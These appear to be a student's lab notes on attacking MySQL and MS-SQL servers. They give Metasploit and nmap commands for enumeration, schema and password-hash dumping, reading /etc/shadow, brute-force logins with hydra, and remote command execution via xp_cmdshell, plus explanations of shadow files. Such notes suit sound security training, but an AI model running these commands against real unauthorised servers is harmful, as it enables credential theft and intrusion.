# SQL basics

## Enumeration with mysql context
* Check with nmap [IP] to know if SQL is running on any of the ports on the target system
* `mysql -h [target IP] -u root` ---> -u for the username. Since the target system is running on Ubuntu as chekced in the nmap scan, "root" tends to be the default admin.
* `show databases;` ---> This can be chacked after entering the SQL context via the previous statement. Will show all the SQL DBs present on that system.
* `show tables;`
* Then we can perform SQL queries on any of these listed tables. EG: `select * from [table_name];`
* `help`

## Enumeration with msfconsole
* `use auxiliary/scanner/mysql/mysql_writable_dirs`
  * set "dir_list" to the [directory_file].txt
  * set "verbose" to false as this will avoid a flood of messages.
  * This will check the directories which are writable.
* Q5. Dump the schema of all databases from the server using suitable metasploit module?
  *Commands:
    * `use auxiliary/scanner/mysql/mysql_schemadump`
    * set RHOSTS 192.71.145.3
    * set USERNAME root
    * set PASSWORD ""
    * exploit
 
* Q7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
  * Commands:
    * use auxiliary/scanner/mysql/mysql_file_enum
    * set RHOSTS 192.71.145.3
    * set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
    * set PASSWORD ""
    * exploit
   
* Q9. How many database users are present on the database server? Lists their names and password hashes.
  * Commands:
    * use auxiliary/scanner/mysql/mysql_hashdump
    * set RHOSTS 192.71.145.3
    * set USERNAME root
    * set PASSWORD ""
    * exploit
   
* Q11. Check whether “InteractiveClient” capability is supported on the MySQL server.
  * Command: nmap --script=mysql-info -p 3306 192.71.145.3

**Significance of /etc/shadow**
* The `/etc/shadow` file is a crucial system file in Unix-like operating systems, including Linux. It plays a significant role in enhancing the security of user account passwords on a system. The significance of the `/etc/shadow` file lies in its role in storing password-related information securely:

1. **Password Hash Storage**: The primary purpose of the `/etc/shadow` file is to store password hashes for user accounts. Instead of storing actual plaintext passwords, modern Unix-like systems store password hashes, which are cryptographic representations of passwords. This adds a layer of security because plaintext passwords are not readily available to attackers in case of unauthorized access to the system.

2. **Enhanced Security**: By storing password hashes in `/etc/shadow`, the system ensures that sensitive user authentication information is protected. Only authorized processes and users with proper permissions can access this file, reducing the risk of unauthorized access.

3. **Salted Passwords**: `/etc/shadow` allows for the use of salted passwords. A salt is a random value that is combined with the user's password before hashing. Salting passwords helps prevent the use of precomputed tables (rainbow tables) for password cracking, making it more challenging for attackers to crack passwords.

4. **Shadow Password Suite**: The `/etc/shadow` file is part of the shadow password suite, which separates password-related information from the `/etc/passwd` file. This separation improves security by limiting access to sensitive data. The `/etc/passwd` file, which contains user account information, is generally readable by all users, while `/etc/shadow` is accessible only to users with specific permissions.

5. **Password Aging and Policies**: `/etc/shadow` stores information related to password aging and policies, such as password expiration dates, minimum password age, maximum password age, and password history. This allows system administrators to enforce password management policies effectively.

6. **Root Privileges**: Access to the `/etc/shadow` file is restricted to users with root (superuser) privileges. Ordinary users do not have direct access to this file, preventing them from viewing or modifying password hashes.

7. **Crucial for Security**: Compromising the `/etc/shadow` file can have severe security consequences. Unauthorized access or tampering with this file can lead to the exposure of password hashes and potentially enable password cracking attacks, putting user accounts and system security at risk.

* `use auxiliary/scanner/mysql/mysql_hashdump` --> this is designed to extract password hashes from a MYSQL DB server.
* `select load_file ("etc/shadow");`
* **What is the typical format for a password hash?**
 * Eg: $6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/
 * The password hashes in the /etc/shadow file are typically stored in a format that includes the hash algorithm identifier, the salt, and the hashed password.
 * In this case, it appears to be using the SHA-512 hash algorithm (indicated by $6$), followed by the salt (eoOI5IAu), and then the hashed password.

* **To check if there are any accounts with empty passwords:**
  * `nmap [IP] -p 3306 --script=mysql-empty-password`
 
* **For further info on the target database**
  * `nmap [IP] -p 3306 --script=mysql-info`
 
* **To list all the MySQL users**
  * `nmap [IP] -p 3306 --script=mysql-users --script-args-"mysqluser='root',mysqlpass=''"`
 
* **To list all the databases**
  * `nmap [IP] -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"`
 
* **To find out location of all the variables associated with the DB**
  * `nmap [IP] -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"`
  * The most important of the variables in this output will be the location of "datadir" variable
 
* **To audit the MySQL DB**
  * `nmap [IP] -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit-password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"`
 
* **To list all the hashes**
  * `nmap [IP] -p 3306 --script-args=mysql-dump-hashes --script-args="username='root',password=''"`
 
* **To pass a query in an nmap script**
  * `nmap [IP] -p 3306 --script=mysql-query --script-args="query='select count(*) from [DB-name].[table-name]',username='root',password=''"`
 
# SQL: Dictionary Attack

* `use auxiliary/scanner/mysql/mysql_login`
  * `set rhosts` --> `set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` --> `set usernmae root` --> `set stop_on_success true` --> `set verbose false`
 
* `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [IP] mysql`

# Targetting MS-SQL
* `nmap -p 1433 --script ms-sql-info [IP]`
* `nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [IP]`
* **Brute-scan**: `nmap -p 1433 --script ms-sql-brute --script-args userdb=[path/to/common_users.txt],passdb=[path/to/common_passwords.txt] [IP]`
* **Find an empty password**: `nmap -p 1433 --script ms-sql-empty-password [IP]`
* **Getting info. for system login from master..syslogins**:
  * `nmap -p 1433 --script ms-sql-query --script-args mssql.username=[username from brute scan],mssql.password=[password from the brute scan], ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt [IP]`
     *  FROM master..syslogins: This part of the query specifies the source table. It selects data from the "syslogins" table in the "master" database.
     *  The "syslogins" table typically stores information about login accounts and their properties in an MS SQL Server instance
     *  **Why two dots(..)** :
        *  In SQL Server, the use of two dots (`..`) in a query, such as `master..syslogins`, is a shorthand notation that allows you to reference an object (in this case, the table "syslogins") without specifying the              schema       explicitly. When you use `..`, SQL Server automatically looks in the default schema of the user executing the query for the specified object.
        *  Here's how this notation works:
        *  1. **Default Schema**: In SQL Server, each user has a default schema associated with their account. When you create database objects (tables, views, etc.), they are typically associated with a specific                       schema. If you don't explicitly specify the schema when referencing an object, SQL Server assumes you are referring to an object in your default schema.
           2.  **Master Database**: In the case of the "master" database, it is common for many system-related objects to be created without specifying a schema explicitly. Therefore, when you reference objects in the                   "master" database, you can use the shorthand notation with `..`, and SQL Server will automatically look for those objects in your default schema within the "master" database.
         *  For example, if your user account has a default schema of "dbo" (the default schema for most users), then when you execute the query `master..syslogins`, SQL Server will interpret it as if you had written                `master.dbo.syslogins`.
         * In summary, the use of two dots (`..`) in SQL Server allows you to reference objects in the default schema of the user executing the query. This shorthand notation simplifies queries and is commonly used when            referencing objects in the "master" database or other system databases where objects often don't have schemas explicitly specified.
      
 * **Hash dumps in ms-sql**: `nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=[username from brute scan],mssql.password=[pawd] [IP]`
 * **Run query in the cmd shell on a remote machine**:
   * `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=[u],mssql.password[pwd],ms-sql-xp-cmdshell.cmd="ipconfig [or any other shell command like--> type c:\flag.txt]" [IP]`
